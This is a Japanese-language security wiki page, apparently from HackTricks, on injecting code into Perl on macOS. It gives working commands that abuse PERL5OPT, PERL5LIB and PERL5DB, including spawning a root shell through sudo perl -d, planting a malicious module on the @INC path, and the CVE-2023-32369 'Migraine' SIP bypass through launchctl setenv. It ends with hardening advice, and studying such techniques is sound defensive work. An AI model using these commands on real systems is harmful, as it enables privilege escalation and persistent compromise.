# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

**`PERL5OPT`** env variableを使用すると、インタープリターの起動時に（対象スクリプトの最初の行が解析される**前**であっても）**Perl**に任意のコマンドを実行させることが可能です。
例えば、次のスクリプトを作成します：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
次に **環境変数** を **export** し、**perl** スクリプトを実行します：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
もう1つの選択肢は、Perl module（例: `/tmp/pmod.pm`）を作成することです：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
そして、env variables を使用して、module が自動的に見つけられてロードされるようにします:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### その他の興味深い環境変数

- **`PERL5DB`** – interpreter が **`-d`**（debugger）flag 付きで起動された場合、`PERL5DB` の内容は debugger context *内で* Perl code として実行されます。
privileged Perl process の environment **と** command-line flags の両方に影響を与えられる場合、次のように実行できます。

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – Windows では、この variable によって、shell の spawn が必要になった際に Perl が使用する shell executable を制御します。macOS には関係しないため、ここでは完全性のためにのみ記載します。

`PERL5DB` には **`-d`** switch が必要ですが、verbose troubleshooting のためにこの flag を有効にした状態で *root* として実行される maintenance または installer scripts が見つかることは珍しくありません。そのため、この variable は有効な privilege escalation vector となります。

## dependencies 経由（@INC abuse）

Perl が検索する include path（**`@INC`**）は、次のコマンドを実行して一覧表示できます。
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14での典型的な出力は次のようになります。
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
返されるフォルダの一部は実際には存在しませんが、**`/Library/Perl/5.30`** は存在し、SIP によって保護されておらず、SIP によって保護されたフォルダよりも前にあります。したがって、*root* として書き込み可能であれば、悪意のあるモジュール（例：`File/Basename.pm`）を配置し、そのモジュールを import する特権スクリプトによって *優先的に* 読み込ませることができます。

> [!WARNING]
> `/Library/Perl` 内に書き込むには依然として **root** が必要であり、macOS は書き込み操作を実行するプロセスに対して *Full Disk Access* を求める **TCC** プロンプトを表示します。

たとえば、スクリプトが **`use File::Basename;`** を import している場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成できます。

## Migration Assistant による SIP bypass（CVE-2023-32369 “Migraine”）

2023 年 5 月、Microsoft は **CVE-2023-32369**（通称 **Migraine**）を公開しました。これは、*root* attacker が **System Integrity Protection（SIP）** を完全に **bypass** できる post-exploitation technique です。
脆弱な component は **`systemmigrationd`** で、**`com.apple.rootless.install.heritable`** entitlement が付与された daemon です。この daemon が spawn する child process は entitlement を継承するため、SIP の制限外で実行されます。<sup>[[1]](#references)</sup>

研究者が特定した child の中には、Apple-signed interpreter も含まれています：<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl は `PERL5OPT` を尊重し（Bash は `BASH_ENV` を尊重するため）、daemon の*環境*を汚染するだけで、SIP-less context で任意のコード実行を得ることができます：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC` が実行されると、`/usr/bin/perl` は悪意のある `PERL5OPT` を使用して起動し、SIP が再有効化される*前に* `/private/tmp/migraine.sh` を実行します。そのスクリプトから、例えば **`/System/Library/LaunchDaemons`** 内に payload をコピーしたり、`com.apple.rootless` extended attribute を割り当ててファイルを**削除不能**にしたりできます。

Apple は macOS **Ventura 13.4**、**Monterey 12.6.6**、**Big Sur 11.7.7** でこの issue を修正しましたが、古いシステムや未適用のシステムは引き続き exploit の対象です。<sup>[[1]](#references)</sup>

## Hardening の推奨事項

1. **危険な variables をクリアする** – privileged launchdaemons や cron jobs は、pristine environment（`launchctl unsetenv PERL5OPT`、`env -i` など）で開始する必要があります。
2. **interpreter を root として実行しない** – 厳密に必要な場合を除き、compiled binaries を使用するか、早い段階で privileges を drop します。
3. **vendor scripts では `-T`（taint mode）を使用する** – taint checking が有効な場合、Perl は `PERL5OPT` やその他の unsafe switches を無視します。
4. **macOS を最新の状態に保つ** – “Migraine” は current releases で完全に patch 済みです。

## References

- [1] [Microsoft Security Blog – 新たな macOS vulnerability「Migraine」により System Integrity Protection を bypass 可能（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
